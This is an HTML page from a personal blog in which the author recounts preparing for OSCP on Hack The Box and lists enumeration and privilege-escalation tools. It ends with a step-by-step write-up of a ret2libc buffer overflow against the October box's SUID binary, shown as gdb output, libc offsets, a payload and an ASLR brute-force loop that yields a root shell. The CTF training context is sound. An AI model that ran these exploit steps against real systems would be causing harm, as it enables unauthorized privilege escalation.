@@ -1,0 +1,386 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>The hardest CTF challenge I have ever played.</title>
+
+  <link rel="icon" type="image/png" href="/assets/images/logo.png?v=96ad5fd1fb">
+  <link rel="apple-touch-icon" href="/assets/images/logo.png?v=96ad5fd1fb">
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Space+Grotesk:wght@400;500;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <link rel="stylesheet" href="/assets/css/style.css?v=96ad5fd1fb">
+
+  <link rel="canonical" href="https://sheerazali.com/blog/the-hardest-ctf-challenge-i-have-ever-played/">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    
+    <meta property="og:site_name" content="Sheeraz Ali">
+    <meta property="og:type" content="article">
+    <meta property="og:title" content="The hardest CTF challenge I have ever played.">
+    <meta property="og:description" content="When I joined hack the box 6 months back I didn’t know what to do I was trying different machines and I was not able to compromise any.
+
+played CTF’s before and won them but this was really new CTF challenges were easier than this. I am writing">
+    <meta property="og:url" content="https://sheerazali.com/blog/the-hardest-ctf-challenge-i-have-ever-played/">
+    <meta property="og:image" content="https://i0.wp.com/sheerazali.com/wp-content/uploads/2019/11/@Mubix.png?fit&#x3D;1920%2C1080&amp;ssl&#x3D;1">
+    <meta property="article:published_time" content="2019-11-15T01:37:07.000Z">
+    <meta property="article:modified_time" content="2021-05-20T21:56:13.000Z">
+    <meta property="article:tag" content="CTF">
+    
+    <meta property="article:publisher" content="https://www.facebook.com/ghost">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="The hardest CTF challenge I have ever played.">
+    <meta name="twitter:description" content="When I joined hack the box 6 months back I didn’t know what to do I was trying different machines and I was not able to compromise any.
+
+played CTF’s before and won them but this was really new CTF challenges were easier than this. I am writing">
+    <meta name="twitter:url" content="https://sheerazali.com/blog/the-hardest-ctf-challenge-i-have-ever-played/">
+    <meta name="twitter:image" content="https://i0.wp.com/sheerazali.com/wp-content/uploads/2019/11/@Mubix.png?fit&#x3D;1920%2C1080&amp;ssl&#x3D;1">
+    <meta name="twitter:label1" content="Written by">
+    <meta name="twitter:data1" content="sheeraz ali">
+    <meta name="twitter:label2" content="Filed under">
+    <meta name="twitter:data2" content="CTF">
+    <meta name="twitter:site" content="@beingsheerazali">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="675">
+    
+    <script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "publisher": {
+        "@type": "Organization",
+        "name": "Sheeraz Ali",
+        "url": "https://sheerazali.com/",
+        "logo": {
+            "@type": "ImageObject",
+            "url": "https://sheerazali.com/favicon.ico"
+        }
+    },
+    "author": {
+        "@type": "Person",
+        "name": "sheeraz ali",
+        "image": {
+            "@type": "ImageObject",
+            "url": "https://www.gravatar.com/avatar/b78e4b3b7f8de6d5dafee8306d76ace7?s=250&r=x&d=mp",
+            "width": 250,
+            "height": 250
+        },
+        "url": "https://sheerazali.com/author/sheeraz/",
+        "sameAs": []
+    },
+    "headline": "The hardest CTF challenge I have ever played.",
+    "url": "https://sheerazali.com/blog/the-hardest-ctf-challenge-i-have-ever-played/",
+    "datePublished": "2019-11-15T01:37:07.000Z",
+    "dateModified": "2021-05-20T21:56:13.000Z",
+    "image": {
+        "@type": "ImageObject",
+        "url": "https://i0.wp.com/sheerazali.com/wp-content/uploads/2019/11/@Mubix.png?fit=1920%2C1080&ssl=1",
+        "width": 1200,
+        "height": 675
+    },
+    "keywords": "CTF",
+    "description": "When I joined hack the box 6 months back I didn’t know what to do I was trying different machines and I was not able to compromise any.\n\nplayed CTF’s before and won them but this was really new CTF challenges were easier than this. I am writing this in a OSCP prep context because that might be helpful for you to understand if I am ready for OSCP or not.\n\n\nWhy it was hard for me?\n\n 1. The problem was I was individually learning how to use the tool’s but when it came to a network and getting a foo",
+    "mainEntityOfPage": "https://sheerazali.com/blog/the-hardest-ctf-challenge-i-have-ever-played/"
+}
+    </script>
+
+    <meta name="generator" content="Ghost 5.130">
+    <link rel="alternate" type="application/rss+xml" title="Sheeraz Ali" href="https://sheerazali.com/rss/">
+    <script defer src="https://cdn.jsdelivr.net/ghost/portal@~2.51/umd/portal.min.js" data-i18n="true" data-ghost="https://sheerazali.com/" data-key="15f06e61ecb8d951198e7015b6" data-api="https://sheerazali.com/ghost/api/content/" data-locale="en" crossorigin="anonymous"></script><style id="gh-members-styles">.gh-post-upgrade-cta-content,
+.gh-post-upgrade-cta {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+    text-align: center;
+    width: 100%;
+    color: #ffffff;
+    font-size: 16px;
+}
+
+.gh-post-upgrade-cta-content {
+    border-radius: 8px;
+    padding: 40px 4vw;
+}
+
+.gh-post-upgrade-cta h2 {
+    color: #ffffff;
+    font-size: 28px;
+    letter-spacing: -0.2px;
+    margin: 0;
+    padding: 0;
+}
+
+.gh-post-upgrade-cta p {
+    margin: 20px 0 0;
+    padding: 0;
+}
+
+.gh-post-upgrade-cta small {
+    font-size: 16px;
+    letter-spacing: -0.2px;
+}
+
+.gh-post-upgrade-cta a {
+    color: #ffffff;
+    cursor: pointer;
+    font-weight: 500;
+    box-shadow: none;
+    text-decoration: underline;
+}
+
+.gh-post-upgrade-cta a:hover {
+    color: #ffffff;
+    opacity: 0.8;
+    box-shadow: none;
+    text-decoration: underline;
+}
+
+.gh-post-upgrade-cta a.gh-btn {
+    display: block;
+    background: #ffffff;
+    text-decoration: none;
+    margin: 28px 0 0;
+    padding: 8px 18px;
+    border-radius: 4px;
+    font-size: 16px;
+    font-weight: 600;
+}
+
+.gh-post-upgrade-cta a.gh-btn:hover {
+    opacity: 0.92;
+}</style>
+    <script defer src="https://cdn.jsdelivr.net/ghost/sodo-search@~1.8/umd/sodo-search.min.js" data-key="15f06e61ecb8d951198e7015b6" data-styles="https://cdn.jsdelivr.net/ghost/sodo-search@~1.8/umd/main.css" data-sodo-search="https://sheerazali.com/" data-locale="en" crossorigin="anonymous"></script>
+    
+    <link href="https://sheerazali.com/webmentions/receive/" rel="webmention">
+    <script defer src="/public/cards.min.js?v=96ad5fd1fb"></script>
+    <link rel="stylesheet" type="text/css" href="/public/cards.min.css?v=96ad5fd1fb">
+    <script defer src="/public/member-attribution.min.js?v=96ad5fd1fb"></script><style>:root {--ghost-accent-color: #FF1A75;}</style>
+</head>
+<body class="post-template tag-ctf tag-hash-import-2026-01-05-15-55">
+
+<div class="terminal-wrapper">
+
+  <header class="site-header">
+  <div class="container">
+    <div class="header-content">
+
+      <a href="https://sheerazali.com/" class="site-logo">
+        <img src="/assets/images/logo.png" alt="Sheeraz Ali">
+      </a>
+
+      <nav class="main-nav">
+        <ul>
+          <li><a href="https://sheerazali.com/" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>home<span class="bracket">]</span></a></li>
+          <li><a href="/blog/" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>blog<span class="bracket">]</span></a></li>
+          <li><a href="/timeline/" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>timeline<span class="bracket">]</span></a></li>
+          <li><a href="/resume/" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>resume<span class="bracket">]</span></a></li>
+          <li><a href="https://www.codevigilant.com/author/syed_sheeraz_ali/" target="_blank" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>cves<span class="bracket">]</span></a></li>
+          <li><a href="https://sheerazali.com/#contact" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>contact<span class="bracket">]</span></a></li>
+        </ul>
+      </nav>
+
+      <div class="header-status">
+        <span class="status-indicator">
+          <span class="status-dot"></span>
+          <span class="status-text">Online</span>
+        </span>
+      </div>
+
+    </div>
+  </div>
+</header>
+
+  <main class="main-content">
+    
+<article class="single-post">
+  <div class="container">
+
+    <header class="post-header">
+      <div class="post-meta-top">
+        <a href="https://sheerazali.com/tag/ctf/" class="post-category">CTF</a>
+        <span class="post-date">November 15, 2019</span>
+        <span class="reading-time">13 min read</span>
+      </div>
+
+      <h1 class="post-title glitch" data-text="The hardest CTF challenge I have ever played.">The hardest CTF challenge I have ever played.</h1>
+
+      <div class="post-author">
+        <span class="author-label">Author:</span>
+        <a href="https://sheerazali.com/author/sheeraz/">sheeraz ali</a>
+      </div>
+    </header>
+
+    <div class="featured-image">
+      <img src="https://i0.wp.com/sheerazali.com/wp-content/uploads/2019/11/@Mubix.png?fit&#x3D;1920%2C1080&amp;ssl&#x3D;1" alt="The hardest CTF challenge I have ever played.">
+    </div>
+
+    <div class="post-body">
+      <div class="content-wrapper">
+        <div class="terminal-window">
+          <div class="terminal-header">
+            <span class="terminal-dot red"></span>
+            <span class="terminal-dot yellow"></span>
+            <span class="terminal-dot green"></span>
+            <span class="terminal-title">The hardest CTF challenge I have ever played.</span>
+          </div>
+          <div class="terminal-content">
+            <p>When I joined hack the box 6 months back I didn’t know what to do I was trying different machines and I was not able to compromise any.</p><p>played CTF’s before and won them but this was really new CTF challenges were easier than this. I am writing this in a OSCP prep context because that might be helpful for you to understand if I am ready for OSCP or not.</p><h2 id="why-it-was-hard-for-me">Why it was hard for me?</h2><ol><li>The problem was I was individually learning how to use the tool’s but when it came to a network and getting a foothold on machines I failed miserably at it. privesc for me felt easier than getting an initial foothold on the machines on hack the box.</li><li>Before hacking the box I never touched windows boxes in pentesting before so in starting it was hard for me to get windows privilege escalation and hard to follow and grasp concepts such as Active directory environment.</li><li>Buffer overflow’s I did understand the concept of buffer overflow’s but practically reaching out and doing buffer overflow even with tutorials was super hard to understand. Especially all the register’s scared me.</li></ol><h2 id="what-i-tried-and-which-worked-but-barely">What I tried and which worked but barely.</h2><p>I planed to prepare for OSCP as advised by my seniors. I looked up on google how to prep for OSCP and I was on it for hours reading how to prepare. I got to know about vuln hub in 2018 and I started to solve machines on vulnhub machines that I first solved were all marked easy to name them they were</p><ol><li>Mr.robot</li><li>Basic pentesting 1</li><li>Basic Pentesting 2</li><li>Derp and Stink</li><li>Lin.security ( which was actually based on multiple ways to privesc )</li><li>unknowndevice64: 2</li><li>unknowndevice64: 1</li></ol><p>then I learnt about <strong>over the wire</strong> and i solved there first and second machine. and then I thought I was pretty good but then again I also saw writeups for 4 of these machines out of all.</p><p>so I started hack the box 6 months back and the first machine i ever rooted was irked. which was active at that time, I took around more than 2-3 days to solve irked.</p><p>for solving irked I first did a port scan then I found</p><figure class="kg-card kg-image-card"><img src="/assets/images/blog/2019_11_1.png" class="kg-image" alt loading="lazy" width="714" height="299"></figure><p>these services were running on the server. first thing I did in my methodology. was to do a version scan of ports and then search public exploits for the open service’s and it almost always worked on vulnhub. I also didn’t have an organized way of doing this at the time <strong><s>which didn’t work </s></strong>. so i tried enumerating the services. first one being</p><ol><li>HTTP which didn’t have anything on it but just a picture of an emoji</li><li>SSH version was not vulnerable by any public exploit.</li><li>Ureal IRC, however, was vulnerable but no service version available and searchsploit returned a ton of exploits.  there was a Metasploit module and i didn’t use Metasploit because i cant in oscp but couldn’t exploit it.</li></ol><p>i looked around and finally read about how to enumerate unrealIRC for the version number and found the vulnerable version number in the IRC chat application and then i tried and got an initial foothold on the system.  <a href="//www.hackingtutorials.org/metasploit-tutorials/hacking-unreal-ircd-3-2-8-1/">Article that i used for finding version number and exploiting the service</a></p><p>after i got foothold i had problems uploading linenum at the time but i did it in temp and then ran it. didn’t find anything then i did manual enumeration and found a backup file that had a sting something that looked like a password i tried sudo as a user and supplied the password but it was wrong.</p><p>I looked more and more and used dirb against port 80 which didn’t found anything either.</p><p>then looking at the password like string it was written “super-elite steg password backup” and i thought maybe its steganography. i went on the server and downloaded that emoji image.</p><figure class="kg-card kg-image-card"><img src="//i2.wp.com/3.bp.blogspot.com/-Zmmf5n-Efxg/XMXW1V1xpiI/AAAAAAAAeIo/O-O5H61uwXI3hdYO8z-yglGF24gFBhQ2QCLcBGAs/s1600/6.png?w=687&amp;ssl=1" class="kg-image" alt loading="lazy"></figure><p>did steghide with that password and i got another password like string so i tried to ssh into the machine and i got in as DJMardov.</p><p>i uploaded linenum again in /tmp and found a binary with suid called /usr/bin/viewer. after some time i understood that this suid bit was executing something in the file /tmp/listusers which we have write permissions on so i rewrote it as !/bin/sh, and i ran /usr/bin/view user and i got root immediately.</p><figure class="kg-card kg-image-card"><img src="/assets/images/blog/2019_11_8.png" class="kg-image" alt loading="lazy" width="770" height="350"></figure><h2 id="what-worked">What worked.</h2><p>After not being able to solve any box successfully solving IRKED gave me a rush and i wanted to do more machines right away HELP was the second machine i tried.</p><p>I tried my techniques but after some time i was clueless on what to do and how to enumerate even what to enumerate. I tried for constant 3  times and the ways i tried to upload a shell as the image.php.png  it eventually retired after some time and I waited for it to retire and i watched ippsec’s video on how he did it and turned out i didn’t think as i should have. my methodology was failing against all htb machines. i had a lot to learn a lot just watching ippsec’s video was not cutting it for me.</p><p>i made a new HTB Account and bought htb premium and my goal was to solve all the machines on hack the box. I started with lame and used ippsec’s videos as a means of learning and in almost every video. I solved over around 54 machines on Hack the box with ippsecs help i learnt 4-5 new thing’s that i didn’t know before with every machine i solved. so i started to maintain a file called <strong>learnt.md</strong> in every machine i solved in their respective folders.</p><p>apart from HTB, i started to learn 32bit assembly language course on the pentester academy for buffer overflow’s because i couldn’t wrap my head around registers. and then i did understand the concept of buffer overflows and i was practically able to do it</p><p>i solved buffer overflow machines on hack the box such as:</p><ol><li>October</li><li>Node</li><li>Sneaky</li><li>etc</li></ol><p>which had techniques like aslr brute-forcing and dep enabled. i also took pentester academy’s “exploiting simple buffer overflow on win 32”  course solved all its exercise and then i took another course from cyber mentor solving vulnserver. I also solved Pheonix by exploit education. before oscp i plan to do protostar and complete Pheonix.</p><p>with hack the box, i made a new methodology and learnt more ways we can get the initial foothold on a system and how to Privesc and i also got buffer overflows down.</p><p>now the last challenge was about windows exploitation out of those 54 machines it was clear that i solved a lot of windows machines as well. so i had enough ideas about how to solve them. also, i did all the oscp like machines for windows and Linux which after 15 or so machines i found easy. The last machine i did which is active and is a windows machine is Heist and i found exploiting it pretty easy. I took pentester academies <a href="//www.pentesteracademy.com/course?id=47" rel="noreferrer noopener">Attacking and Defending Active Directory</a> which helped me a lot in understanding active directory and its different attack vectors enumeration and exploitation common and advanced red teaming for Windows AD environment. I understood many ways to privesc in a windows domain environment although i am still learning in this area quite a bit every day i have not yet completed this whole course i did perform kerberosting and silver &amp;  golden ticket attacks.</p><p>that’s how i am overcoming all these challenges that i had initially</p><h2 id="automating-the-manual">Automating the manual</h2><p>After solving all those machines solving them became a sort of easy job after i solved almost all medium and easy boxes. i have been up on exploring ways to automate the process of recon and enumeration as much as i can so i can focus on real stuff which needs my attention. Because OSCP only has 24 hours i have to automate almost everything i can. I also coded some python tools for my that can be found on my <a href="//github.com/pwnmoew/Python-Projects">Github </a>these were to practice some coding. i also wrote shell scripts to automate some manual things as well. which can be found in my other repo of all the machines from hack the box.</p><h3 id="tool%E2%80%99s-i-use-for-automation">Tool’s i use for automation</h3><ul><li><em><a href="//github.com/21y4d/nmapAutomator">Nmap Automater </a></em> – for automatic enumeration and recon</li><li><a href="//tools.kali.org/information-gathering/sparta">Sparta</a> –  for automatic enumeration and recon</li><li><a href="//md2pdf.netlify.com/">Markdown to pdf </a> – Writing rough report as i go</li><li><a href="//github.com/JohnHammond/poor-mans-pentest">Poor mans pentest</a> – shell automation</li><li><a href="//github.com/rebootuser/LinEnum">LinEnum  </a> – linux priesc</li><li><a href="//www.securitysift.com/download/linuxprivchecker.py">linprivchecker  </a> – linux privesc</li><li><a href="//github.com/HarmJ0y/PowerUp">Powerup </a> – windows privesc</li><li><a href="//github.com/411Hall/JAWS">Jaws </a>– windows privesc</li><li><a href="//github.com/rasta-mouse/Sherlock">Sherlock </a>– windows privesc</li><li><a href="//github.com/M4ximuss/Powerless">Powerless  </a>– windows privesc</li><li><a href="//github.com/bitsadmin/wesng">windows exploit suggester </a>– privesc</li><li><a href="//github.com/mzet-/linux-exploit-suggester">linux exploit suggester </a>– privesc</li><li><a href="//github.com/sagishahar/lpeworkshop">lpeworkshop</a> – this repo for refrence</li></ul><h2 id="my-new-methodology-which-works-always-pretty-much">My new methodology which works always (pretty much).</h2><h4 id="initial-foot-hold">Initial Foot Hold</h4><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2019_11_1-1-1024x466.png" class="kg-image" alt loading="lazy" width="770" height="350"><figcaption><a href="//coggle.it/diagram/Xc22uIumpF-XkYEi/t/pentest-methodology?present=1" target="_blank" rel="noreferrer noopener" aria-label=" (opens in a new tab)">https://coggle.it/diagram/Xc22uIumpF-XkYEi/t/pentest-methodology?present=1https://coggle.it/diagram/Xc22uIumpF-XkYEi/t/pentest-methodology?present=1</a></figcaption></figure><p>these are the ways i try first to get an initial foothold now solving htb helped me a lot of building this understanding of how to we can get initial access to a system. please click on the link and see the coggle zoomed in and detailed.</p><h2 id="privesc">Privesc</h2><figure class="kg-card kg-image-card kg-card-hascaption"><img src="//camo.githubusercontent.com/acb487594dbe457b6711a0a70eb545ec828159a8/68747470733a2f2f7062732e7477696d672e636f6d2f6d656469612f44415a73453256555141415f62705a2e6a7067" class="kg-image" alt loading="lazy"><figcaption><a href="//github.com/sagishahar/lpeworkshop">sagishahar/lpeworkshop</a></figcaption></figure><p>i use this guide as my reference for privesc its  <a href="//github.com/sagishahar/lpeworkshop">sagishahar/lpeworkshop</a> guide and have worked for me for automating things i use above-mentioned tools in order to privesc i have also used Metasploit for privilege escalation.</p><h2 id="summery-tldr">Summery TLDR;</h2><p>I have explained how the first machine i ever did on hack the box was very hard for me to do, i did it but my methods were all wrong to approach a target i have explained how i progressed form that one hard machine to solving all easy and almost all medium machines also tools i use to fasten up the process and to enumerate. I eventually got HACKER rank on hack the box and i am making my way through to elite hacker now. post have in detail’s what tools and techniques i used to solve the earlier explained problems such as buffer overflows, windows machines, getting initial access on the box.</p><p>PS:- Credits for all the images solving IRKED goes to <a href="//www.hackingarticles.in/hack-the-box-irked-walkthrough/">hacking articles </a>as the machine was retired and i can’t take screenshots of  it anymore</p><h2 id="more-technical-details-on-buffer-overflow-challenges-and-windows-challenges"><strong>More Technical details on buffer overflow challenges and windows challenges </strong></h2><p><strong>Privesc for October</strong></p><ol><li>found a file after privesc with suid  <strong>/usr/local/bin/ovrflw</strong></li><li>on running the file it ask’s for a string</li></ol><pre><code class="language-bash">www-data@october:/usr/local/bin/$ ./ovrflw
+Syntax: ./ovrflw &lt;input string&gt;</code></pre><p>3. gave it an input of 1000 ‘A”s  got a segmentation fault name was overflow so guessed it was overflow and we found segmentation fault 4. check for aslr to see if lib c’s address was changing from ippsecs</p><pre><code>www-data@october:/home/harry$ cat /proc/sys/kernel/randomize_va_space 
+2
+www-data@october:/home/harry$ ldd /usr/local/bin/ovrflw | grep libc  
+        libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xb75b1000)
+www-data@october:/home/harry$ ldd /usr/local/bin/ovrflw | grep libc
+        libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xb763b000)
+www-data@october:/home/harry$ ldd /usr/local/bin/ovrflw | grep libc
+        libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xb7606000)</code></pre><p>5. transferred the file with base64 and did checksec on overflw</p><pre><code>root@kali# checksec ovrflw
+[*] '/media/sf_CTFs/hackthebox/october-10.10.10.16/ovrflw'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)</code></pre><p>NX means is enabled which means i cant run shellcode on the stack we have to do a return to lib c attack</p><p>we open the binary in gdb</p><pre><code>root@kali# gdb -q ./ovrflw
+Reading symbols from ./ovrflw...(no debugging symbols found)...done.
+gdb-peda$</code></pre><p>i create pattern to create a pattern of 500</p><pre><code>gdb-peda$ pattern_create 500
+'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6A'
+gdb-peda$ run 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6A'
+[----------------------------------registers-----------------------------------]
+EAX: 0x0 
+EBX: 0x0 
+ECX: 0xffffd3e0 ("As6A")
+EDX: 0xffffd0fc ("As6A")
+ESI: 0xf7f99000 --&gt; 0x1d9d6c 
+EDI: 0xf7f99000 --&gt; 0x1d9d6c 
+EBP: 0x6941414d ('MAAi')
+ESP: 0xffffcf80 ("ANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8"...)
+EIP: 0x41384141 ('AA8A')
+EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+Invalid $PC address: 0x41384141
+[------------------------------------stack-------------------------------------]
+0000| 0xffffcf80 ("ANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8"...)
+0004| 0xffffcf84 ("jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA"...)
+0008| 0xffffcf88 ("AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%"...)
+0012| 0xffffcf8c ("AkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%O"...)
+0016| 0xffffcf90 ("PAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA"...)
+0020| 0xffffcf94 ("AAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%"...)
+0024| 0xffffcf98 ("AmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%Q"...)
+0028| 0xffffcf9c ("RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA"...)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x41384141 in ?? ()</code></pre><p>crashed at 0x41384141 we use pattern_offset <code>EIP: 0x41384141 ('AA8A')</code></p><pre><code>gdb-peda$ pattern_offset AA8A
+AA8A found at offset: 112
+gdb-peda$ pattern_offset 0x41384141
+1094205761 found at offset: 112</code></pre><p>test run with offset</p><pre><code>gdb-peda$ run `python -c 'print "A"*112 + "BBBB"'`
+Stopped reason: SIGSEGV
+0x42424242 in ?? ()</code></pre><p><strong>overfl ret to libc</strong></p><p>we will find a libc reffernnce address for brute force later <strong> </strong> and finding offsets for /bin/sh</p><pre><code>www-data@october:/dev/shm$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -e " system@" -e " exit@"
+   139: 00033260    45 FUNC    GLOBAL DEFAULT   12 exit@@GLIBC_2.0
+  1443: 00040310    56 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0
+www-data@october:/dev/shm$ strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep "/bin/" 
+ 162bac /bin/sh
+ 164b10 /bin/csh</code></pre><p>with this i have found  base address for all we need to do is to exploit</p><pre><code>exit: 0xb75f8000+0x33260 = 0xB762B260
+system: 0xb75f8000+0x40310 = 0xB7638310
+/bin/sh: = 0xb75f8000+0x162bac = 0xB775ABAC</code></pre><p>we can not straight away do this because aslr is enabled</p><pre><code>www-data@october:/dev/shm$ /usr/local/bin/ovrflw $(python -c 'print "\x90"*112 + "\x10\x83\x63\xb7" + "\x60\xb2\x62\xb7" + "\xac\xab\x75\xb7"');</code></pre><p>we need to run it in  a loop until bin/sh address matches because libc”s address is changing every time the program runs it’ll be able to find the right lib.c address and we get root</p><pre><code>www-data@october:/dev/shm$ while true; do /usr/local/bin/ovrflw $(python -c 'print "\x90"*112 + "\x10\x83\x63\xb7" + "\x60\xb2\x62\xb7" + "\xac\xab\x75\xb7"'); done
+*** Error in `/usr/local/bin/ovrflw': munmap_chunk(): invalid pointer: 0xbfeeae83 ***
+Aborted (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (cre dumped)
+Illegal instruction (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+Segmentation fault (core dumped)
+# id
+uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)
+# cat /root/root.txt
